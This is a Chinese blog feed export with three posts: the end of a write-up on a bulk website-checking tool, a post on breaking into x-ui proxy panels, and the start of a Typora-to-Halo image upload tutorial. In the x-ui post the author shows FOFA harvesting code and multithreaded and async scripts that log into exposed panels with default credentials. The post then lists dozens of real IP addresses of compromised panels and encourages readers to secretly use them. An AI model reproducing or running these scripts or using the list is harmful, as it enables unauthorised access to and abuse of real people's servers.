库构建图形用户界面，提供直观、易用的操作界面。用户可以通过简单的按钮操作完成网站检测，并实时查看检测进度和结果。</li><li><strong>超时时间和验证设置：</strong> 用户可以根据实际情况设置超时时间，以避免因网站响应过慢导致的程序阻塞。同时，支持用户选择是否验证 SSL 证书，以适应不同网络环境，提示满足不同的需求。</li><li><strong>结果导出：</strong> 工具在检测完成后，将结果输出到 Excel 文件中，方便用户查看和分析。用户可以通过 Excel 文件快速了解每个网站的基本信息，以及是否存在异常情况，同时也可以判断网站是否违规违法。</li><li><strong>更新检查：</strong> 提供更新检查功能，用户可以通过工具查看是否有新版本发布。在有新版本可用时，用户可以选择立即更新，以获取更好的功能和性能。</li><li><strong>开源地址和使用介绍：</strong> 工具提供了开源地址和使用介绍的链接，用户可以通过这些链接获取更多关于工具的信息、源代码以及使用方法。这有助于用户更全面地了解和使用工具。</li><li><strong>ICP 备案和网安备案解析：</strong> 对通过 API 获取的 ICP 备案和网安备案信息进行解析，提取关键信息并展示给用户。这样用户可以更方便地了解网站的备案情况。</li><li><strong>用户反馈和建议：</strong> 提供用户反馈和建议的渠道，鼓励用户在使用过程中发现问题或有改进建议时积极反馈。用户的反馈将有助于工具的不断优化和改进。</li></ol><p><strong>通过以上主要功能，该网站批量检测工具旨在为用户提供一种便捷、高效、可视化的方式，帮助用户快速获取多个网站的基本信息，同时保持灵活性和可定制性，以适应不同用户和场景的需求。</strong></p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ol><li><strong>网信工作者</strong>：可以经常批量检测网站情况，及时发现违法网站并对使其整改。</li><li><strong>网站管理者：</strong> 用用于定期批量检测网站状态，及时发现异常情况。</li><li><strong>数据分析人员：</strong> 提供了对大规模网站数据进行批量处理和分析的能力。</li></ol><h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ol><li><strong>启动应用程序</strong>： 双击运行打包后的应用程序，启动应用程序后，会看到一个图形用户界面（GUI）窗口弹出。</li><li><strong>导入 URL 列表</strong>： 在应用程序窗口中，有一个按钮或菜单项，用于导入包含待检测 URL 的 Excel 文件。点击该按钮或选择相应的菜单项，然后选择要导入的 Excel 文件。系统会读取文件中的 URL 列表。<ul><li><strong>注意：请将表格文件中第一列放置 URL，且从第一行开始。</strong></li></ul></li><li><strong>配置检测参数</strong> ： 配置检测参数，如超时时间、最大重试次数等，同时确定是否开启 icp 备案和网安备案信息获取。</li><li><strong>执行备案信息检测和网站判断</strong>： 类似于 ICP 备案检测，应用程序可能提供了执行公安备案检测的按钮或菜单项。点击该按钮，系统将访问每个 URL，尝试获取其公安备案信息。结果可能显示在界面上或保存到 Excel 文件中。</li><li><strong>查看和导出结果：</strong> 完成 ICP 备案和公安备案检测时，会在日志界面上显示结果摘要。包括每个 URL 的备案信息。此外，最终检测结果都会导出至 Excel 文件中，用户可查看并导出，以便进一步分析或备份。</li><li><strong>关闭应用程序：</strong> 完成所有操作后，可以通过关闭应用程序窗口来退出程序。。</li></ol><h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul><li><strong>Python：</strong> 项目主要使用 Python 语言进行开发。</li><li><strong>PySide6：</strong> 用于构建图形用户界面。</li><li><strong>Requests、Aiohttp、Httpx：</strong> 用于进行同步和异步的 HTTP 请求。</li><li><strong>BeautifulSoup：</strong> 用于解析网页内容。</li><li><strong>Openpyxl：</strong> 用于 Excel 文件的读写。</li><li><strong>ThreadPoolExecutor：</strong> 用于实现多线程处理。</li><li><strong>Fake User-Agent：</strong> 用于生成随机 User-Agent，增加请求的随机性。</li></ul><h2 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h2><ol><li><strong>性能优化与稳定性提升</strong>： 不断优化爬虫代码，提高程序的稳定性和执行效率，确保在处理大规模数据时仍能保持良好的性能。</li><li><strong>用户界面优化与友好化</strong>： 进一步改进图形化界面，提升用户体验，增加更多直观的操作提示和反馈信息，使工具更加易用。</li><li><strong>配置选项</strong>： 增加更多的配置选项，提供更灵活的检测方案。</li><li><strong>功能拓展与定制化</strong>： 考虑添加更多实用的功能模块，比如定时任务、自定义规则筛选、结果导出等，以满足用户在实际工作中的多样化需求。</li><li><strong>社区反馈与更新</strong>： 鼓励用户提供反馈意见和建议，及时修复和更新工具，确保它始终适应网络环境和政策法规的变化</li><li><strong>添加更多异常网站的识别规则。</strong></li><li><strong>增加日志记录，方便用户跟踪程序执行过程。</strong></li></ol><h2 id="反馈与贡献"><a href="#反馈与贡献" class="headerlink" title="反馈与贡献"></a>反馈与贡献</h2><p><strong>如果您有任何建议、反馈或者愿意为项目做贡献，请随时联系我。欢迎您的参与，让这个工具变得更加完善！</strong></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li><strong>使用合法性：</strong> 该网站批量检测工具仅供合法用途使用，用户在使用过程中需确保遵守所在国家 &#x2F; 地区的法规和政策。禁止使用该工具进行非法活动。</li><li><strong>免责声明：</strong> 本工具对使用者的行为概不负责，由用户个人或单位使用该工具所产生的任何法律责任和风险均由用户自行承担。开发者对工具的使用不承担任何连带责任。</li><li><strong>隐私保护：</strong> 用户使用该工具时，应当自行确保所获取的网站信息的使用符合隐私保护法规。开发者不对用户通过本工具获取的网站信息的隐私合规性承担责任。</li><li><strong>第三方服务：</strong> 本工具使用了第三方服务、API 等，用户在使用过程中应仔细阅读和遵守相关服务协议，开发者对第三方服务可能带来的影响概不负责。</li><li><strong>免责声明变更：</strong> 开发者保留随时更改、修订或更新本免责声明的权利。用户在使用工具的过程中应定期查阅最新版本的免责声明。</li><li><strong>技术风险：</strong> 本工具使用了多线程、异步请求等技术，尽管经过精心设计和多次测试，但在使用时仍可能存在一定的技术风险。用户在使用前应当理解可能的技术风险，并自行承担因技术问题可能带来的损失。</li><li><strong>无担保声明：</strong> 本工具按现状提供，开发者不提供任何明示或暗示的担保，包括但不限于对工具的适用性、准确性、可靠性、完整性、及时性等方面的担保。用户在使用本工具时应自行承担相应风险。</li><li><strong>联系方式：</strong> 如有任何关于使用本工具的疑问、建议或问题，请通过工具提供的联系方式与开发者取得联系。</li></ol><p><strong>通过使用网站批量检测工具，即表示您已阅读、理解并同意上述免责声明的全部内容。如不同意上述免责声明的任一条款，请立即停止使用该工具。</strong></p><p><strong>下载地址：</strong><a href="https://github.com/mBigFish/web_scan">https://github.com/mBigFish/web_scan</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【原创】x-ui面板爬虫爬取及登陆分享</title>
      <link href="/archives/202408312115.html"/>
      <url>/archives/202408312115.html</url>
      
        <content type="html"><![CDATA[<h1 id="x-ui面板爬虫爬取及登陆分享"><a href="#x-ui面板爬虫爬取及登陆分享" class="headerlink" title="x-ui面板爬虫爬取及登陆分享"></a>x-ui面板爬虫爬取及登陆分享</h1><ul><li><strong>由于最近闲，于是想着干一些事情 于是想到 fofa 黑暗搜索引擎，上去以后搞了一个教育会员，结果发现是企业会员 于是不能浪费，就去想到自己搭建的 x-ui 面板，然后看了一眼 发现默认端口是 54321，默认账号密码是 admin，但是大多数人肯定已经修改了端口和密码，但肯定会有一些人懒到搞，全部是默认。</strong></li><li><strong>于是就尝试一下 先去爬取默认端口 54321 的 ip，然后我就爬的不多，就爬了 1w 个 ip，然后对爬到的 ip 进行请求返回值 code 判断是否为 200，为 200 的然后进行默认账号密码继续爬取，最后就爬了几千个 ip，然后成功登陆的有几十个，这里就分享一下 ip，你们上去不要乱搞，可以偷偷用，他们肯定也发现不了</strong></li><li><strong>在这里分享一个最后整理的简易的爬虫代码</strong></li></ul><h4 id="fofa-代码"><a href="#fofa-代码" class="headerlink" title="fofa 代码"></a>fofa 代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import pythonfofa</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def userinfo(client):</span><br><span class="line">    #个人信息</span><br><span class="line">    info = client.userinfo()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">def write(results):</span><br><span class="line">    with open(&#x27;ip.txt&#x27;, &#x27;a+&#x27;) as fp:</span><br><span class="line">        for item in results:</span><br><span class="line">            ip = item[0]</span><br><span class="line">            country = item[1]</span><br><span class="line">            print(ip, country)</span><br><span class="line">            fp.write(ip+&#x27;|&#x27;+country+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">    for item in open(&#x27;./ip.txt&#x27;, &#x27;r&#x27;):</span><br><span class="line">        #print(item)</span><br><span class="line">        item = item.split(&#x27;|&#x27;)</span><br><span class="line">        ip = item[0]</span><br><span class="line">        country = item[1].replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">        print(country)</span><br><span class="line"></span><br><span class="line">def get_ip(client):</span><br><span class="line"></span><br><span class="line">    for page in range(1, 2):</span><br><span class="line">        # 查询语句</span><br><span class="line">        query_str = &#x27;port=&quot;54321&quot; &amp;&amp; title==&quot; 登录 &quot;&#x27;</span><br><span class="line">        field = [&#x27;ip&#x27;,&#x27;country_name&#x27;]</span><br><span class="line"></span><br><span class="line">        #查询结果</span><br><span class="line">        #handle.search(query_text, field, page, size, full)</span><br><span class="line">        data = client.search(query_str,field=field, page=page,size=10000)</span><br><span class="line"></span><br><span class="line">        # noinspection PyBroadException</span><br><span class="line">        try:</span><br><span class="line">            results = data[&#x27;results&#x27;]</span><br><span class="line">            print(results)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&#x27;运行错误，账号密码可能出错！&#x27;)</span><br><span class="line">            print(data)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">            #写入文件</span><br><span class="line">            write(results)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    email, key = (&#x27;email&#x27;,&#x27;key&#x27;)</span><br><span class="line">    client = pythonfofa.Client(email,key)</span><br><span class="line"></span><br><span class="line">    get_ip(client)</span><br><span class="line">    #read()</span><br></pre></td></tr></table></figure><h4 id="多线程爆密码"><a href="#多线程爆密码" class="headerlink" title="多线程爆密码"></a>多线程爆密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">def download(ip, country):</span><br><span class="line">    params = &#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;123456&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    url = &#x27;http://&#x27; + ip + &#x27;:54321/login&#x27;</span><br><span class="line">    # noinspection PyBroadException</span><br><span class="line">    data = requests.post(url=url, params=params)</span><br><span class="line">    code = data.status_code</span><br><span class="line">    #print(url, data)</span><br><span class="line"></span><br><span class="line">    if code == 200:</span><br><span class="line">        data = data.json()</span><br><span class="line">        #print(data)</span><br><span class="line">        if &#x27;登录&#x27; in data[&#x27;msg&#x27;]:</span><br><span class="line">            with open(&#x27;./ip1-ok.txt&#x27;, &#x27;a+&#x27;) as fp:</span><br><span class="line">            print(ip, &#x27;获取成功！&#x27;)</span><br><span class="line">            fp.write(ip + &#x27;|&#x27; + country + &#x27;\n&#x27;)</span><br><span class="line">            fp.close()</span><br><span class="line">        else:</span><br><span class="line">            print(ip,&#x27;密码错误！&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(ip,&#x27;访问失败！&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    with ThreadPoolExecutor(500) as t:</span><br><span class="line">        for item in open(&#x27;./ip.txt&#x27;, &#x27;r&#x27;):</span><br><span class="line">            item = item.split(&#x27;|&#x27;)</span><br><span class="line">            ip = item[0]</span><br><span class="line">            #print(url)</span><br><span class="line">            country = item[1].replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">            t.submit(download, ip, country)</span><br><span class="line"></span><br><span class="line">            print(&quot;全部下载完成！&quot;)</span><br></pre></td></tr></table></figure><h4 id="异步爆密码"><a href="#异步爆密码" class="headerlink" title="异步爆密码"></a>异步爆密码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">import aiohttp</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def download(ip):</span><br><span class="line">    params = &#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;admin&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;admin&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    url = &#x27;http://&#x27; + ip + &#x27;:54321/login&#x27;</span><br><span class="line">    #print(url)</span><br><span class="line">    async with aiohttp.ClientSession() as session:</span><br><span class="line">        async with session.post(url, params=params) as req:</span><br><span class="line">            data = await req.text()</span><br><span class="line">            #print(data)</span><br><span class="line">            if &#x27;登录&#x27; in data:</span><br><span class="line">                print(ip, &#x27;成功！&#x27;)</span><br><span class="line">                with open(&#x27;ip1-ok.txt&#x27;,&#x27;a+&#x27;) as fp:</span><br><span class="line">                    fp.write(ip + &#x27;\n&#x27;)</span><br><span class="line">            else:</span><br><span class="line">            print(ip,&#x27;错误！&#x27;)</span><br><span class="line">            #请求回来了，写入文件</span><br><span class="line">            # with open(name,&#x27;wb&#x27;) as fp:</span><br><span class="line">            #     #读取内容是异步的，需要 await 挂起</span><br><span class="line">            #     fp.write(await req.content.read())</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    # urls = [</span><br><span class="line">    #     &#x27;https://pic.quanjing.com/c6/cx/QJ6880697447.jpg&#x27;,</span><br><span class="line">    #     &#x27;https://pic.quanjing.com/3g/lv/QJ6594284520.jpg&#x27;,</span><br><span class="line">    #     &#x27;https://pic.quanjing.com/ng/wd/QJ8166536175.jpg&#x27;,</span><br><span class="line">    #     &#x27;https://pic.quanjing.com/hj/jj/QJ6802044841.jpg&#x27;,</span><br><span class="line">    #     &#x27;https://pic.quanjing.com/tn/6t/QJ9127562743.jpg&#x27;,</span><br><span class="line">    #     &#x27;https://pic.quanjing.com/39/uc/QJ7108531848.jpg&#x27;,</span><br><span class="line">    # ]</span><br><span class="line"></span><br><span class="line">    tasks = []</span><br><span class="line">    for item in open(&#x27;./ip.txt&#x27;, &#x27;r&#x27;):</span><br><span class="line">        item = item.split(&#x27;|&#x27;)</span><br><span class="line">        ip = item[0]</span><br><span class="line">        # print(url)</span><br><span class="line">        country = item[1].replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">        d = asyncio.create_task(download(ip))</span><br><span class="line">        tasks.append(d)</span><br><span class="line"></span><br><span class="line">await asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    #asyncio.run(main()) 会报错</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    loop.run_until_complete(main())</span><br><span class="line"></span><br><span class="line">    t2 = time.time()</span><br><span class="line">    print(&#x27;所需时间：&#x27;, t2 - t1)</span><br></pre></td></tr></table></figure><p>在这里主要分享一些思路 和最后爬到的几十个 ip，分享给你们 可以免费用一下，因为在爬取中有重复 ip，但也懒得整理，所以直接分享了。</p><blockquote><p><a href="http://5.75.205.179:54321/">http://5.75.205.179:54321</a> <a href="http://120.55.170.201:54321/">http://120.55.170.201:54321</a> <a href="http://120.55.170.201:54321/">http://120.55.170.201:54321</a> <a href="http://192.227.225.235:54321/">http://192.227.225.235:54321</a> <a href="http://192.227.225.235:54321/">http://192.227.225.235:54321</a> <a href="http://23.88.126.130:54321/">http://23.88.126.130:54321</a> <a href="http://23.88.126.130:54321/">http://23.88.126.130:54321</a> <a href="http://5.255.112.234:54321/">http://5.255.112.234:54321</a> <a href="http://5.255.112.234:54321/">http://5.255.112.234:54321</a> <a href="http://135.181.105.138:54321/">http://135.181.105.138:54321</a> <a href="http://135.181.105.138:54321/">http://135.181.105.138:54321</a> <a href="http://212.64.214.160:54321/">http://212.64.214.160:54321</a> <a href="http://212.64.214.160:54321/">http://212.64.214.160:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://193.3.182.223:54321/">http://193.3.182.223:54321</a> <a href="http://193.3.182.223:54321/">http://193.3.182.223:54321</a> <a href="http://18.163.81.25:54321/">http://18.163.81.25:54321</a> <a href="http://124.71.219.86:54321/">http://124.71.219.86:54321</a> <a href="http://124.71.219.86:54321/">http://124.71.219.86:54321</a> <a href="http://18.163.81.25:54321/">http://18.163.81.25:54321</a> <a href="http://5.75.205.179:54321/">http://5.75.205.179:54321</a> <a href="http://5.75.205.179:54321/">http://5.75.205.179:54321</a> <a href="http://120.55.170.201:54321/">http://120.55.170.201:54321</a> <a href="http://120.55.170.201:54321/">http://120.55.170.201:54321</a> <a href="http://192.227.225.235:54321/">http://192.227.225.235:54321</a> <a href="http://192.227.225.235:54321/">http://192.227.225.235:54321</a> <a href="http://23.88.126.130:54321/">http://23.88.126.130:54321</a> <a href="http://23.88.126.130:54321/">http://23.88.126.130:54321</a> <a href="http://5.255.112.234:54321/">http://5.255.112.234:54321</a> <a href="http://5.255.112.234:54321/">http://5.255.112.234:54321</a> <a href="http://135.181.105.138:54321/">http://135.181.105.138:54321</a> <a href="http://135.181.105.138:54321/">http://135.181.105.138:54321</a> <a href="http://212.64.214.160:54321/">http://212.64.214.160:54321</a> <a href="http://212.64.214.160:54321/">http://212.64.214.160:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://116.203.57.40:54321/">http://116.203.57.40:54321</a> <a href="http://79.132.133.53:54321/">http://79.132.133.53:54321</a> <a href="http://79.132.133.53:54321/">http://79.132.133.53:54321</a> <a href="http://70.34.215.201:54321/">http://70.34.215.201:54321</a> <a href="http://70.34.215.201:54321/">http://70.34.215.201:54321</a> <a href="http://65.21.60.82:54321/">http://65.21.60.82:54321</a> <a href="http://65.21.60.82:54321/">http://65.21.60.82:54321</a> <a href="http://212.64.214.194:54321/">http://212.64.214.194:54321</a> <a href="http://212.64.214.194:54321/">http://212.64.214.194:54321</a> <a href="http://43.138.153.220:54321/">http://43.138.153.220:54321</a> <a href="http://43.138.153.220:54321/">http://43.138.153.220:54321</a> <a href="http://185.126.236.151:54321/">http://185.126.236.151:54321</a> <a href="http://37.32.13.170:54321/">http://37.32.13.170:54321</a> <a href="http://185.126.236.151:54321/">http://185.126.236.151:54321</a> <a href="http://37.32.13.170:54321/">http://37.32.13.170:54321</a> <a href="http://37.32.13.120:54321/">http://37.32.13.120:54321</a> <a href="http://37.32.13.120:54321/">http://37.32.13.120:54321</a> <a href="http://37.32.13.202:54321/">http://37.32.13.202:54321</a> <a href="http://37.32.13.202:54321/">http://37.32.13.202:54321</a> <a href="http://34.64.156.188:54321/">http://34.64.156.188:54321</a> <a href="http://34.64.156.188:54321/">http://34.64.156.188:54321</a> <a href="http://34.64.49.182:54321/">http://34.64.49.182:54321</a> <a href="http://34.64.49.182:54321/">http://34.64.49.182:54321</a> <a href="http://78.109.201.235:54321/">http://78.109.201.235:54321</a> <a href="http://78.109.201.235:54321/">http://78.109.201.235:54321</a> <a href="http://38.60.33.153:54321/">http://38.60.33.153:54321</a> <a href="http://38.60.33.153:54321/">http://38.60.33.153:54321</a> <a href="http://34.64.62.191:54321/">http://34.64.62.191:54321</a> <a href="http://34.64.62.191:54321/">http://34.64.62.191:54321</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 思路 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora上传图片至Halo博客&amp;&amp;Python添加水印</title>
      <link href="//archives/1724656843524/"/>
      <url>//archives/1724656843524/</url>
      
        <content type="html"><![CDATA[<h1 id="Typora上传图片至Halo博客-Python添加水印"><a href="#Typora上传图片至Halo博客-Python添加水印" class="headerlink" title="Typora上传图片至Halo博客&amp;&amp;Python添加水印"></a>Typora上传图片至Halo博客&amp;&amp;Python添加水印</h1><h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><ul><li><strong>前几天打算重新开一个博客，原因是</strong> <code>***************</code>，然后选来选取最后选择了halo框架博客，由于我喜欢用typora写博客，然后在复制到博客里，所以涉及到以下两个问题</li><li><strong>一是：halo博客在粘贴typora内容时，截图不会上传，导致需要一个个的手动粘贴图片，肉眼可见麻烦，于是在网上找了一下关于批量粘贴图片插件，发现没有，又在网上找了很多相关教程，最后发现了一篇文章，可以参考一下（</strong><a href="https://blog.t1m2h0u.com/archives/shi-yong-halo-zuo-wei-typora-tu-chuang">使用 Halo 作为 Typora 图床</a>）。</li><li><strong>二是：就在今天，无意发现有很多人搬运我的博客内容时，文章下面都不给我一个外链或者说明，于是我就想在博客上传图片时想添加一个水印，于是又去找相关插件，发现还是没有，突然联系到第一个问题中本来就是上传图片时用typora执行自定义命令，就是python代码实现的，那么添加水印同样可以使用python完成，于是又在网上找python添加水印文章，试了几个代码发现都有问题，可能是时间久了，有些功能已经弃用了，于是干脆自己写了一个。</strong></li></ul><h2 id="二、Typora上传图片"><a href="#二、Typora上传图片" class="headerlink" title="二、Typora上传图片"></a>二、Typora上传图片</h2><h3 id="（一）安装-Node-js"><a href="#（一）安装-Node-js" class="headerlink" title="（一）安装 Node.js"></a>（一）安装 Node.js</h3><ul><li><strong>建议直接去官网下：</strong><a href="https://nodejs.org/en/download/package-manager">https://nodejs.org/en/download/package-manager</a></li><li><strong>安装后在终端执行，查看是否安装成功</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002935864870-0959585.png" alt="image-20240826234933568"></p><h3 id="（二）安装-Halo-Attachment-Upload-CLI"><a href="#（二）安装-Halo-Attachment-Upload-CLI" class="headerlink" title="（二）安装 Halo Attachment Upload CLI"></a>（二）安装 Halo Attachment Upload CLI</h3><ul><li><strong>终端执行下面命令</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install @halo-dev/attachment-upload-cli -g</span><br></pre></td></tr></table></figure><ul><li><strong>安装成功后，验证一下是否成功</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hau --help</span><br></pre></td></tr></table></figure><h3 id="（三）配置-Halo-Attachment-Upload-CLI"><a href="#（三）配置-Halo-Attachment-Upload-CLI" class="headerlink" title="（三）配置 Halo Attachment Upload CLI"></a>（三）配置 Halo Attachment Upload CLI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hau setup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 按照提示输入以下内容：</span><br><span class="line">1、Halo博客地址，如：https://www.mbigfish.com</span><br><span class="line">2、Halo博客账户：如：admin</span><br><span class="line">3、Halo博客密码：如：admin123</span><br><span class="line">4、Halo博客附件存储策略，如：本地存储</span><br><span class="line">5、Halo博客附件存储策略分组，如：默认</span><br></pre></td></tr></table></figure><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002936613870-20241107140625598.png" alt="image-20240826235610430"></p><h3 id="（四）配置Typora"><a href="#（四）配置Typora" class="headerlink" title="（四）配置Typora"></a>（四）配置Typora</h3><ul><li><strong>打开 Typora，进入*</strong>*文件 -&gt; 偏好设置 -&gt; 图像<strong>，将上传服务改为</strong>自定义命令**，输入 <code>hau upload -f</code> 即可。</li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002937364617-20241107140626377.png" alt="image-20240827000330663"></p><ul><li><strong>以下结果，则为配置成功。</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002938140971-20241107140626233.png" alt="image-20240827000211808"></p><ul><li><strong>注意：这里其实这样配置就已经完成了，但是因为这个配置，每次只能成功上传一张图片，因此才用到了一下的py脚本执行。</strong></li></ul><p><img src="/../images/Typora%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E8%87%B3Halo%E5%8D%9A%E5%AE%A2&&Python%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0/image-20240827002938956208-20241107140625642.png" alt="image-20240827000308756"></p><h3 id="（五）python脚本："><a href="#（五）python脚本：" class="headerlink" title="（五）python脚本："></a>（五）python脚本：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 